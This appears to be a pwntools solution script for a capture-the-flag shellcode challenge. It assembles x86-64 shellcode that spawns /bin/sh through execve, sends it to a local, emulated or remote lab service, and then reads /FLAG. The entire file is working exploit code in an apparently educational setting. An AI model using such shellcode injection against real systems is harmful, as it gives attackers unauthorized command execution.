#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './challenges/shellcode'
port = 10257

elf = ELF(exe) # 
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

# print(hex(u64('hello!\n\x00'))) # 0xa216f6c6c6568
# codes = """
# mov rdi, 1
# mov rax, 0xa216f6c6c6568
# push rax
# mov rsi, rsp
# mov rdx, 7
# mov rax, 1
# syscall

# mov rdi, 0
# mov rax, 60
# syscall
# """

print(hex(u64(b'/bin/sh\x00'))) # 0x68732f6e69622f


codes = """
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

mov rsi, 0
mov rdx, 0
mov rax, 59
syscall

mov rdi, 0
mov rax, 60
syscall
"""

payloads = asm(codes)
# print(codes)
# print(len(payloads), payloads)
# pause()

r.recvuntil(b'code> ')
r.send(payloads)

r.send(b'cat /FLAG\n')
print(r.recv())

# r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :